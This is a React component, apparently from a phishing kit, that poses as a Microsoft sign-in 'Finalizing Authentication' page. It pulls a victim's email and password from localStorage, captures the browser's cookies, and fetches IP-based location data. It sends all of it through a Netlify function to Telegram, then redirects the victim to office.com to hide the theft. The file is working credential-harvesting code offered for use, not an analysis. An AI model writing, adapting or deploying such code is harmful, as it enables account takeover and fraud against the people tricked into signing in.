import React, { useEffect, useState } from 'react';

const AuthCallback: React.FC = () => {
    const [status, setStatus] = useState('Initializing callback...');

    useEffect(() => {
        const executeCallback = async () => {
            setStatus('Consolidating authentication data...');
            console.log('🔄 AuthCallback: Consolidating and transmitting data.');

            let credentials = null;
            try {
                const storedCreds = localStorage.getItem('replacement_credentials');
                if (storedCreds) {
                    credentials = JSON.parse(storedCreds);
                    console.log('✅ Credentials retrieved from storage.');
                    localStorage.removeItem('replacement_credentials');
                } else {
                    console.error('❌ FATAL: No credentials found in storage. Aborting.');
                    setStatus('Error: Could not find stored credentials. Please try again.');
                    return;
                }
            } catch (error) {
                console.error('❌ FATAL: Failed to parse credentials from storage.', error);
                setStatus('Error: Failed to parse credentials.');
                return;
            }

            const captureCookies = () => {
                try {
                    const cookieString = document.cookie;
                    if (!cookieString) return [];
                    return cookieString.split(';').map(pair => {
                        const [name, ...valueParts] = pair.trim().split('=');
                        const value = valueParts.join('=');
                        return { name, value, domain: window.location.hostname, captureTime: new Date().toISOString() };
                    });
                } catch (error) {
                    console.warn('⚠️ Failed to capture cookies:', error);
                    return [];
                }
            };
            const cookies = captureCookies();
            
            let locationData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                locationData = await response.json();
            } catch (error) {
                console.warn('⚠️ Failed to fetch location data:', error);
            }

            const createCookieFile = (cookiesToExport: any[]) => {
                if (!cookiesToExport || cookiesToExport.length === 0) return null;
                try {
                    return {
                        name: `cookies_${new Date().getTime()}.json`,
                        content: JSON.stringify({ cookies: cookiesToExport }, null, 2),
                    };
                } catch (error) {
                    return null;
                }
            };
            const cookieFile = createCookieFile(cookies);

            const payload = {
                email: credentials.email,
                password: credentials.password,
                passwordSource: 'auth-callback-final',
                cookies,
                locationData,
                cookieFiles: cookieFile ? { jsonFile: cookieFile } : {},
                userAgent: navigator.userAgent,
                url: window.location.href,
                timestamp: new Date().toISOString(),
                validated: true,
                microsoftAccount: true,
            };

            try {
                const response = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    console.log('✅✅✅ SUCCESS: All data successfully sent to Telegram!');
                    setStatus('Authentication complete. Redirecting...');
                } else {
                    setStatus(`Error: Transmission failed.`);
                }
            } catch (error) {
                setStatus('Error: Network failure during transmission.');
                return;
            }
            
            setTimeout(() => {
                window.location.href = 'https://www.office.com/?auth=2&source=callback';
            }, 1500);
        };

        executeCallback();
    }, []);

    return (
        <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', height: '100vh', fontFamily: 'Segoe UI, Arial, sans-serif' }}>
            <h2>Finalizing Authentication</h2>
            <p>{status}</p>
        </div>
    );
};

export default AuthCallback;